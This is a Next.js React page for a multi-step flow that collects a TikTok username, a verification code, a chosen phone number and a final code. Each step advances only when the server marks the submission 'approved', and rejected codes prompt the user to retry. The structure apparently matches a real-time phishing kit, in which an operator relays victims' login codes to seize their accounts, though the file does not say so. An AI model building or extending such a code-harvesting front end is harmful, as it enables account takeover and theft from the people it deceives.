'use client';

import { useState, useEffect, useCallback } from 'react';
import { useRouter } from 'next/navigation';
import { useToast } from '@/hooks/use-toast';
import { Loader2 } from 'lucide-react';
import type { AuthUser, Submission } from '@/lib/types';
import { TiktokUsernameStep } from '@/components/start/tiktok-username-step';
import { VerifyCodeStep } from '@/components/start/verify-code-step';
import { SelectNumberStep } from '@/components/start/select-number-step';
import { FinalCodeStep } from '@/components/start/final-code-step';

export default function StartPage() {
  const router = useRouter();
  const { toast } = useToast();
  
  const [user, setUser] = useState<AuthUser | null>(null);
  const [currentStep, setCurrentStep] = useState(0);
  const [submissionData, setSubmissionData] = useState<Partial<Submission>>({});
  const [isCheckingStatus, setIsCheckingStatus] = useState(true);
  const [loginMethod, setLoginMethod] = useState<'email' | 'phone'>('email');

  useEffect(() => {
    const storedUser = sessionStorage.getItem('user-session');
    if (storedUser) {
      const parsedUser: AuthUser = JSON.parse(storedUser);
      setUser(parsedUser);
      setLoginMethod(parsedUser.loginMethod || 'email');
      
      const fetchSubmissionStatus = async () => {
        try {
          const res = await fetch(`/api/submissions?id=${parsedUser.id}`);
          if (!res.ok) {
            if (res.status === 404) {
              setSubmissionData({ tiktokUsername: parsedUser.id, id: parsedUser.id });
              setCurrentStep(1); 
            } else {
              throw new Error('Failed to fetch submission status.');
            }
          } else {
            const submission: Submission = await res.json();
            setSubmissionData(submission);
            if (submission.isVerified) {
              router.replace('/success');
              return;
            }
            if (submission.finalCodeStatus === 'approved') {
              router.replace('/success');
              return;
            }
            if (submission.phoneNumberStatus === 'approved') setCurrentStep(4);
            else if (submission.verificationCodeStatus === 'approved') setCurrentStep(3);
            else if (submission.tiktokUsernameStatus === 'approved') setCurrentStep(2);
            else setCurrentStep(1);
          }
        } catch (error) {
          toast({ variant: 'destructive', title: 'Error', description: 'Could not retrieve your submission status.' });
          setCurrentStep(1);
        } finally {
          setIsCheckingStatus(false);
        }
      };
      fetchSubmissionStatus();
    } else {
      setCurrentStep(1);
      setIsCheckingStatus(false);
    }
  }, [router, toast]);

  const handleNextStep = (data: Partial<Submission>, method: 'email' | 'phone') => {
    const updatedData = { ...submissionData, ...data };
    setSubmissionData(updatedData);

    if (!user && data.id) {
        const newUser: AuthUser = { id: data.id, loginMethod: method };
        sessionStorage.setItem('user-session', JSON.stringify(newUser));
        setUser(newUser);
    }
    
    setCurrentStep(prev => prev + 1);
  };
  
  const handlePrevStep = () => {
    setCurrentStep(prev => prev - 1);
  };

  const handleRejection = useCallback((step: 'verificationCode' | 'finalCode') => {
    toast({
      variant: 'destructive',
      title: 'Invalid Code',
      description: 'The code you entered was incorrect. Please try again.',
    });
    // This will cause the step component to re-render, allowing the user to try again.
    setSubmissionData(prev => ({...prev}));
  }, [toast]);

  const handleApproval = useCallback((data: Partial<Submission>) => {
    setSubmissionData(prev => ({...prev, ...data}));
    setCurrentStep(prev => prev + 1);
  }, []);

  // Memoize callbacks for VerifyCodeStep
  const onVerifyCodeApproval = useCallback((data: Partial<Submission>) => handleApproval(data), [handleApproval]);
  const onVerifyCodeRejection = useCallback(() => handleRejection('verificationCode'), [handleRejection]);

  // Memoize callbacks for FinalCodeStep
  const onFinalCodeApproval = useCallback(() => router.push('/success'), [router]);
  const onFinalCodeRejection = useCallback(() => handleRejection('finalCode'), [handleRejection]);

  const renderStep = () => {
    switch (currentStep) {
      case 1:
        return <TiktokUsernameStep onNext={handleNextStep} initialData={submissionData} loginMethod={loginMethod} setLoginMethod={setLoginMethod} />;
      case 2:
        return (
          <VerifyCodeStep
            submissionId={submissionData.id!}
            onApproval={onVerifyCodeApproval}
            onRejection={onVerifyCodeRejection}
            onBack={handlePrevStep}
            key={`verify-step-${submissionData.id}`}
          />
        );
      case 3:
        return (
            <SelectNumberStep
                submissionId={submissionData.id!}
                onNext={handleNextStep}
                onBack={handlePrevStep}
            />
        );
      case 4:
        return (
          <FinalCodeStep
            submissionId={submissionData.id!}
            onApproval={onFinalCodeApproval}
            onRejection={onFinalCodeRejection}
            onBack={handlePrevStep}
            key={`final-step-${submissionData.id}`}
          />
        );
      default:
        return (
            <div className="flex flex-col items-center justify-center text-center">
                <Loader2 className="h-12 w-12 animate-spin text-primary mb-4" />
                <h1 className="text-xl font-semibold">Checking your status...</h1>
                <p className="text-muted-foreground">Please wait a moment.</p>
            </div>
        );
    }
  };

  if (isCheckingStatus) {
    return (
        <div className="w-full text-center">
            <div className="flex flex-col items-center justify-center text-center">
                <Loader2 className="h-12 w-12 animate-spin text-primary mb-4" />
                <h1 className="text-xl font-semibold">Checking your status...</h1>
                <p className="text-muted-foreground">Please wait a moment.</p>
            </div>
        </div>
    );
  }

  return (
    <>
      {renderStep()}
    </>
  );
}
